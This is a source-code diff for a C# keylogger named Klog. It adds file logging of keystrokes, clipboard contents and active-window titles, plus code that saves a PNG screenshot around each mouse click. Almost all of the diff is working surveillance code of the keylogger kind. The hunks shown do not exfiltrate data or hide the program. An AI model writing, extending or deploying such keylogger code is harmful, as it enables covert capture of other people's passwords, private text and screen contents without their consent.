@@ -5,23 +5,24 @@ using gma.System.Windows;
 using System.Diagnostics;
 using System.Windows.Forms;
 using System.Globalization;
+using System.Drawing;
+using System.Drawing.Imaging;
+using Klog.Properties;
+using System.IO;
 
 namespace Klog
 {
-    public delegate void LogEventDelegate(String s);
-
-    public class SimpleKeylogger : IKeylogger
+    public class SimpleKeylogger 
     {
-        ForegroundWindow _fw = new ForegroundWindow();
-        LogEventDelegate _logEvent;
+        public const String LogFileName = @"Logs\Klog.txt";
 
+        // Helpers
+        ForegroundWindow _window = new ForegroundWindow();
         KeyChord _keyChord = new KeyChord();
+        int _nextBitmapNum = 0;
 
-        public SimpleKeylogger(LogEventDelegate logEvent)
+        public SimpleKeylogger()
         {
-            Debug.Assert(logEvent != null);
-            _logEvent = logEvent;
-
             _keyChord.ClipboardAction += new EventHandler(OnClipboardAction);
         }
 
@@ -33,7 +34,6 @@ namespace Klog
                 LogEvent(Environment.NewLine + "[Clipboard: "+cb+"]" + Environment.NewLine);
             }
         }
-
 
         public void OnKeyDown(object sender, KeyEventArgs e)
         {
@@ -56,17 +56,18 @@ namespace Klog
 
         void LogEvent(String s)
         {
-            if (_logEvent == null) { return; }
             if (String.IsNullOrEmpty(s)) { return; }
 
-            if (_fw.CheckHasChanged())
+            if (_window.CheckHasChanged())
             {
                 String date = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
 
-                _logEvent(Environment.NewLine + "--- " + date + " App: " + _fw.Text + Environment.NewLine);
+                String app = Environment.NewLine + "--- " + date + " App: " + _window.Text + Environment.NewLine;
+                File.AppendAllText(LogFileName, app);
+
             }
 
-            _logEvent(s);
+            File.AppendAllText(LogFileName, s);
         }
 
         public void OnKeyPress(object sender, KeyPressEventArgs e)
@@ -79,19 +80,46 @@ namespace Klog
  
         public void OnMouseActivity(object sender, MouseEventArgs e)
         {
-            String s = MouseEventToString(e);
-            if (!String.IsNullOrEmpty(s))
+            if (e.Clicks == 0)
             {
-                LogEvent(s);
+                String filename = GetNextBitmapFilename();
+                CaptureClickBitmap(e.Location, filename);
+                
+                LogEvent("[Click #"+ (_nextBitmapNum-1) +"]");
             }
         }
 
-        static String MouseEventToString(MouseEventArgs e)
+        String GetNextBitmapFilename()
         {
-            // This is when the button is released
-            if (e.Clicks == 0) { return "[Click]"; }
-            //if (e.Clicks == 1) { return "[MousePress " + e.Button + "]"; }
-            return String.Empty;
+            while (true)
+            {
+                String filename = @"Logs\Click" + _nextBitmapNum.ToString("00000") + ".png";
+                ++_nextBitmapNum;
+                if (!File.Exists(filename)) { return filename; }
+            }
+        }
+
+        void CaptureClickBitmap(Point clickLocation, String filename)
+        {
+            int Off = 4;
+            int r = Settings.Default.ClickScreenshotRadius;
+            Rectangle bounds = new Rectangle(clickLocation.X - r, clickLocation.Y - r, r * 2, r * 2);
+
+            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+            {
+                using (Graphics g = Graphics.FromImage(bitmap))
+                {
+                    g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
+
+                    g.DrawEllipse(Pens.Yellow, r - Off, r - Off, Off * 2, Off * 2);
+                    --Off;
+                    g.DrawEllipse(Pens.Red, r - Off, r - Off, Off * 2, Off * 2);
+
+                    //g.DrawLine(Pens.Red, r - Off, r - Off, r + Off, r + Off);
+                    //g.DrawLine(Pens.Red, r - Off, r + Off, r + Off, r - Off);
+                }
+                bitmap.Save(filename, ImageFormat.Png);
+            }
         }
     }
 }
